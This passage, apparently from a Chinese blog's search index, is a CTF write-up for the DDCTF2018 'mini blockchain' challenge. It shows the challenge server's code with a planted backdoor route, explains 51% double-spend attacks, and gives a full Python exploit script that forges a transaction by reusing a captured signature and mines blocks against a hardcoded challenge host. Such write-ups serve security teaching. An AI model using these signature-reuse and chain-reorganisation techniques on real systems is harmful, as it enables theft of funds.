+<span class="token keyword">def</span> <span class="token function">homepage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    announcement <span class="token operator">=</span> <span class="token string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>
+    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    genesis_block_info <span class="token operator">=</span> <span class="token string">'hash of genesis block: '</span> <span class="token operator">+</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
+    addr_info <span class="token operator">=</span> <span class="token string">'the bank\'s addr: '</span> <span class="token operator">+</span> bank_address <span class="token operator">+</span> <span class="token string">', the hacker\'s addr: '</span> <span class="token operator">+</span> hacker_address <span class="token operator">+</span> <span class="token string">', the shop\'s addr: '</span> <span class="token operator">+</span> shop_address
+    balance_info <span class="token operator">=</span> <span class="token string">'Balance of all addresses: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>balance<span class="token punctuation">)</span>
+    utxo_info <span class="token operator">=</span> <span class="token string">'All utxos: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span>
+    blockchain_info <span class="token operator">=</span> <span class="token string">'Blockchain Explorer: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    view_source_code_link <span class="token operator">=</span> <span class="token string">"&lt;a href='source_code'>View source code&lt;/a>"</span>
+    <span class="token keyword">return</span> announcement<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;br />&lt;br />\r\n\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>view_source_code_link<span class="token punctuation">,</span> genesis_block_info<span class="token punctuation">,</span> addr_info<span class="token punctuation">,</span> balance_info<span class="token punctuation">,</span> utxo_info<span class="token punctuation">,</span> blockchain_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> shop_address
+
+<span class="token keyword">def</span> <span class="token function">find_enough_utxos</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    collected <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">==</span> addr_from<span class="token punctuation">:</span>
+            amount <span class="token operator">-=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>
+            collected<span class="token punctuation">.</span>append<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> collected<span class="token punctuation">,</span> <span class="token operator">-</span>amount
+    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'no enough DDCoins in '</span> <span class="token operator">+</span> addr_from<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    input_utxo_ids<span class="token punctuation">,</span> the_change <span class="token operator">=</span> find_enough_utxos<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>
+    outputs <span class="token operator">=</span> <span class="token punctuation">[</span>create_output_utxo<span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> the_change <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        outputs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>create_output_utxo<span class="token punctuation">(</span>addr_from<span class="token punctuation">,</span> the_change<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> create_tx<span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">free_ddcoin</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'The bank has no money now.'</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        address <span class="token operator">=</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span>
+        addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># to check if it is a valid address</span>
+        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> bank_address<span class="token punctuation">,</span> address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>
+        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b@cKd00R tr1993ReD'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">(</span>balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' DDCoins are successfully sent to '</span> <span class="token operator">+</span> address
+    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'ERROR: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+
+DIFFICULTY <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'00000'</span> <span class="token operator">+</span> <span class="token string">'f'</span> <span class="token operator">*</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/create_transaction'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">create_tx_and_check_shop_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    init<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        block <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+        append_block<span class="token punctuation">(</span>block<span class="token punctuation">,</span> DIFFICULTY<span class="token punctuation">)</span>
+        msg <span class="token operator">=</span> <span class="token string">'transaction finished.'</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+
+    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1000000</span><span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># when 1000000 DDCoins are received, the shop will give you a diamond</span>
+        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token comment" spellcheck="true"># and immediately the shop will store the money somewhere safe.</span>
+        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> shop_address<span class="token punctuation">,</span> shop_wallet_address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span><span class="token punctuation">,</span> shop_privkey<span class="token punctuation">)</span>
+        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'save the DDCoins in a cold wallet'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>
+        msg <span class="token operator">+=</span> <span class="token string">' You receive a diamond.'</span>
+    <span class="token keyword">return</span> msg
+
+
+<span class="token comment" spellcheck="true"># if you mess up the blockchain, use this to reset the blockchain.</span>
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/reset'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">reset_blockchain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token string">'genesis_block_hash'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> <span class="token string">'reset.'</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/source_code'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">show_source_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'serve.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
+    html <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
+        html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
+    source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> html
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span></code></pre>
+<p>其余函数功能：</p>
+<ul>
+<li>addr_to_pubkey：检查地址有效性</li>
+<li>pubkey_to_address：生成钱包地址</li>
+<li>gen_addr_key_pair：生成钱包地址</li>
+<li>create_output_utxo：创建一个utxo</li>
+<li>create_tx：创建一个tx</li>
+<li>create_block：创建一个block</li>
+<li>find_blockchain_tail：查询最后一个block</li>
+<li>calculate_utxo：得到所有utxo</li>
+<li>calculate_balance：计算钱包的余额</li>
+<li>verify_utxo_signature：验证utxo签名</li>
+<li>append_block：添加块</li>
+<li>init：初始化函数</li>
+<li>get_balance_of_all：得到所有block，所有地址和utxo</li>
+<li>homepage：web主页</li>
+<li>getFlag：flag获取页面</li>
+</ul>
+<h2 id="51-双花攻击"><a href="#51-双花攻击" class="headerlink" title="51% 双花攻击"></a>51% 双花攻击</h2><ol>
+<li>这道题整的解法是 51% （双花）攻击。</li>
+<li>请于正常的区块链区分开来，题目环境中只有你一个玩家，并没有人与你竞争（挖矿）。</li>
+<li>商店交易采用0确认，而不是现实中的6确认。</li>
+<li>当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链。<br>区块链允许添加空块</li>
+<li>51%（双花）攻击可以达到的目的就是使攻击前的交易作废，这里的前不一定是前一个，而是很大程度上取决于你的算力的。让之前的交易作废有什么好处呢？这里我们就要考虑0确认和6确认的区别了。</li>
+</ol>
+<p>当产生一笔交易时，区块链的P2P网络会广播这笔交易，这笔交易会被一个挖矿节点收到，并验证，如果这个挖矿节点挖到区块（生成的hash满足条件）后，并且这笔交易的手续费足够吸引这个节点去打包进区块，那这笔交易就会被打包进区块。因此就得到了一个确认，这个矿工也拿走了相应的手续费。 这个挖矿节点打包后，会把区块广播给其他节点。其他节点验证并广播这个区块。 如果这个区块得到更多的挖矿节点的验证确认，那就得到了更多的确认。这样这笔交易就被记录到了比特币区块链，并成为了比特币账本的一部分。如果得到6个确认后，我们就认为它永远不可变了。</p>
+<p>0确认就同样的道理了，那就是不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。</p>
+<p>可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。好在，题目并不是采用6确认。</p>
+<p>然后再看看这里的51% 攻击，其实这里说的51%是指算力，也就是这种攻击需要攻击者具备全网51%的算力，因为这样才有机会使自己生成（挖出）区块的速度超过其他人，然后按区块链的规则：当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链，就达到了撤销原来链上已经存在的交易，拿回该交易使用了的钱的目的，这里我的另一个理解就是可以使交易回滚，从而追回被盗的钱。</p>
+<p>![image-20211115170232249](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170232249.png)</p>
+<p>![image-20211115170248426](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170248426.png)</p>
+<p>按照流程，我们应该构造一个转钱给商店的区块。但通过代码，我们可以发现转账的时候是需要私钥签名的，也就是这个signature段。可以通过黑客留下的signature直接绕过，并且上一步的input也可以从黑客的区块中得到。所以我们就可以直接构造转账给商店的区块了，并且通过51%攻击使黑客转走的钱追回.</p>
+<h3 id="构造方法一"><a href="#构造方法一" class="headerlink" title="构造方法一"></a>构造方法一</h3><p>这种办法只要POST空块即可，转账使用转账后门实现：</p>
+<pre><code>创世块-&gt;黑客块-&gt;空块  
+  │   
+  └──&gt;空块(1)-&gt;空块(2)-&gt;空块(3)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石
+                        │   
+                        └──&gt;空块(4)-&gt;空块(5)-&gt;空块(6)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石</code></pre>
+<ul>
+<li>当POST第三个空块时，主链改变，黑客提走的钱被追回，通过转账后门与POST触发新增两个区块，总长为六块</li>
+<li>接上第三个空块，POST到第六个空块时，主链再次改变，钱又重新回到银行，再次利用后门得到钻石</li>
+</ul>
+<h3 id="构造方法二"><a href="#构造方法二" class="headerlink" title="构造方法二"></a>构造方法二</h3><pre><code>创世块-&gt;黑客块-&gt;空块  
+  │   
+  └──&gt;转账给商店块(1)-&gt;空块(2)-&gt;空块(3)--自动触发--&gt;购买钻石
+                                │   
+                                └──&gt;空块(4)-&gt;空块(5)-&gt;自动触发--&gt;购买钻石</code></pre>
+<ul>
+<li>伪造具有一个银行转给商店的交易记录的区块，这里要伪造tx数据块中的签名</li>
+<li>签名是通过tx数据库中的input（付款utxo的id）和付款方的私钥算出</li>
+<li>所以直接利用黑客块中的签名即可</li>
+<li>当POST到第三块时，主链改变，100w在商店余额中，自动触发购买钻石</li>
+<li>接上第三块，POST到第五块时主链再猜改变，自动触发购买钻石</li>
+</ul>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class=" language-Python"><code class="language-Python"># -*- encoding: utf-8 -*-
+# written in python 2.7
+import hashlib, json, rsa, uuid, os,requests,re
+
+# 一堆变量常量
+
+url_root="http://111.200.241.244:61460/"
+url_create="http://111.200.241.244:61460/create_transaction"
+url_flag="http://111.200.241.244:61460/flag"
+
+s=requests.Session()
+ddcoin = s.get(url=url_root)
+
+prev_one=re.search(r"hash of genesis block: ([0-9a-f]{64})",ddcoin.content, flags=0).group(1)
+bank_utox_id=re.search(r"\"input\": \[\"([0-9a-f\-]{36})",ddcoin.content, flags=0).group(1)
+bank_signature=re.search(r"\"signature\": \[\"([0-9a-f]{96})",ddcoin.content, flags=0).group(1)
+
+DIFFICULTY = int('00000' + 'f' * 59, 16)
+EMPTY_HASH = '0'*64
+
+bank_addr="998f49e4bccfc44ef96313c9be35c2252aee17172118719b7c744bc9033ef3f5904e9a649bc4fab5c4cb3f3d5cac72a5"
+hacke_addr="a8af0c41afd2a78f21ca61d85c84e81acbe4639e31b7ad8988ca0602163451b8bb1d0cb72aaa2bdc9feeecf5411c72bb"
+shop_addr="92b84ee514126392f3e18a960900c82699aa88c666c1e4466878582e2cc18e1869f7a51e9b6f1d5f159ce9e63fadd5e7"
+
+# 源码中的API
+
+def hash(x):
+    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
+
+def hash_reducer(x, y):
+    return hash(hash(x)+hash(y))
+
+def hash_block(block):
+    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])
+
+def hash_utxo(utxo):
+    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])
+
+def hash_tx(tx):
+    return reduce(hash_reducer, [
+        reduce(hash_reducer, tx['input'], EMPTY_HASH),
+        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
+    ])
+
+def create_output_utxo(addr_to, amount):
+    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
+    utxo['hash'] = hash_utxo(utxo)
+    return utxo
+
+def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
+    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
+    tx['hash'] = hash_tx(tx)
+    return tx
+
+def create_block(prev_block_hash, nonce_str, transactions):
+    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
+    nonce = str(nonce_str)
+    if len(nonce) > 128: raise Exception('the nonce is too long')
+    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
+    block['hash'] = hash_block(block)
+    return block
+
+
+# 构造的方法
+
+def check_hash(prev,tx):
+    for i in range(10000000):
+        current_block=create_block(prev,str(i),tx)
+        block_hash = int(current_block['hash'], 16)
+        if block_hash<DIFFICULTY:
+            print json.dumps(current_block)
+            return current_block
+
+def create_feak_one():
+    utxo_first=create_output_utxo(shop_addr,1000000)
+    tx_first=create_tx([bank_utox_id],[utxo_first])
+    return check_hash(prev_one,[tx_first])
+
+def create_empty_block(prev):
+    return check_hash(prev,[])
+
+
+# 攻击过程
+
+a=create_feak_one()
+print s.post(url=url_create,data=str(json.dumps(a))).content
+b=create_empty_block(a['hash'])
+print s.post(url=url_create,data=str(json.dumps(b))).content
+c=create_empty_block(b['hash'])
+print s.post(url=url_create,data=str(json.dumps(c))).content
+d=create_empty_block(c['hash'])
+print s.post(url=url_create,data=str(json.dumps(d))).content
+e=create_empty_block(d['hash'])
+print s.post(url=url_create,data=str(json.dumps(e))).content
+print s.get(url=url_flag).content
+</code></pre>
+<p>![image-20211115114730993](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115114730993.png)</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>DDCTF2018-区块链：</p>
+<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/">https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/</a></p>
+<p>从DDCTF中看区块链安全之51%攻击：</p>
+<p><a href="https://bbs.ichunqiu.com/thread-39743-1-2.html">https://bbs.ichunqiu.com/thread-39743-1-2.html</a></p>
+<p>攻防世界web进阶区Web_python_block_chain详解：</p>
+<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108111692">https://blog.csdn.net/hxhxhxhxx/article/details/108111692</a></p>
+]]></content>
+      <tags>
+        <tag>区块链</tag>
       </tags>
   </entry>
 </search>
